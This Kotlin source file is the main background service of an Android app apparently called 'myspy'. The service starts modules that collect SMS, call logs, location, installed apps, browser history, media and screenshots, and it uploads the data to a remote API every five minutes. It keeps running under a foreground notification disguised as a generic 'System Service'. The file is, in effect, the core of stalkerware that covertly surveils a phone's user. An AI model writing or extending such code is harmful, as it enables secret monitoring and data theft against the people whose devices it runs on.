package com.myspy.android.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.myspy.android.data.local.db.AppDatabase
import com.myspy.android.data.local.prefs.PrefsManager
import com.myspy.android.data.remote.api.ApiClient
import com.myspy.android.data.repository.*
import com.myspy.android.modules.sms.SmsModule
import com.myspy.android.modules.calls.CallsModule
import com.myspy.android.modules.location.LocationModule
import com.myspy.android.modules.apps.AppsModule
import com.myspy.android.modules.internet.InternetModule
import com.myspy.android.modules.media.MediaModule
import com.myspy.android.modules.screen.ScreenModule
import kotlinx.coroutines.*

/**
 * Main Foreground Service
 * @author Michael KOJDL
 * @version 1.0.0
 */
class MainService : Service() {

    companion object {
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "myspy_service_channel"
        private const val SYNC_INTERVAL = 5 * 60 * 1000L // 5 minutes

        fun start(context: Context) {
            val intent = Intent(context, MainService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    private val scope = CoroutineScope(Dispatchers.Default + SupervisorJob())
    private lateinit var prefsManager: PrefsManager
    private lateinit var smsModule: SmsModule
    private lateinit var callsModule: CallsModule
    private lateinit var locationModule: LocationModule
    private lateinit var appsModule: AppsModule
    private lateinit var internetModule: InternetModule
    private lateinit var mediaModule: MediaModule
    private lateinit var screenModule: ScreenModule
    private var syncJob: Job? = null

    override fun onCreate() {
        super.onCreate()

        prefsManager = PrefsManager(this)

        // Initialize modules if registered
        if (prefsManager.isRegistered()) {
            initializeModules()
            startPeriodicSync()
        }

        startForeground(NOTIFICATION_ID, createNotification())
    }

    private fun initializeModules() {
        val database = AppDatabase.getInstance(this)
        val apiService = ApiClient.createService(prefsManager)

        // Initialize SMS module
        val smsRepository = SmsRepository(database.smsDao(), apiService)
        smsModule = SmsModule(this, smsRepository)
        smsModule.start()

        // Initialize Calls module
        val callsRepository = CallsRepository(database.callsDao(), apiService)
        callsModule = CallsModule(this, callsRepository, scope)
        callsModule.start()

        // Initialize Location module
        val locationRepository = LocationRepository(database.locationDao(), apiService)
        locationModule = LocationModule(this, locationRepository, scope)
        locationModule.start()

        // Initialize Apps module
        val appsRepository = AppsRepository(database.appsDao(), apiService)
        appsModule = AppsModule(this, appsRepository, scope)
        appsModule.start()

        // Initialize Internet module
        val browserHistoryRepository = BrowserHistoryRepository(database.browserHistoryDao(), apiService)
        internetModule = InternetModule(this, browserHistoryRepository, scope)
        internetModule.start()

        // Initialize Media module
        val mediaRepository = MediaRepository(database.mediaDao(), apiService)
        mediaModule = MediaModule(this, mediaRepository, scope)
        mediaModule.start()

        // Initialize Screen module
        val screenshotRepository = ScreenshotRepository(database.screenshotDao(), apiService)
        screenModule = ScreenModule(this, screenshotRepository, scope)
        screenModule.start()
    }

    private fun startPeriodicSync() {
        syncJob = scope.launch {
            while (isActive) {
                try {
                    // Sync all modules
                    if (::smsModule.isInitialized) {
                        smsModule.syncData()
                    }
                    if (::callsModule.isInitialized) {
                        callsModule.syncData()
                    }
                    if (::locationModule.isInitialized) {
                        locationModule.syncData()
                    }
                    if (::appsModule.isInitialized) {
                        appsModule.syncData()
                    }
                    if (::internetModule.isInitialized) {
                        internetModule.syncData()
                    }
                    if (::mediaModule.isInitialized) {
                        mediaModule.syncData()
                    }
                    if (::screenModule.isInitialized) {
                        screenModule.syncData()
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                delay(SYNC_INTERVAL)
            }
        }
    }

    private fun createNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager?.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        syncJob?.cancel()
        scope.cancel()

        // Stop all modules
        if (::smsModule.isInitialized) {
            smsModule.stop()
        }
        if (::callsModule.isInitialized) {
            callsModule.stop()
        }
        if (::locationModule.isInitialized) {
            locationModule.stop()
        }
        if (::appsModule.isInitialized) {
            appsModule.stop()
        }
        if (::internetModule.isInitialized) {
            internetModule.stop()
        }
        if (::mediaModule.isInitialized) {
            mediaModule.stop()
        }
        if (::screenModule.isInitialized) {
            screenModule.stop()
        }
    }
}
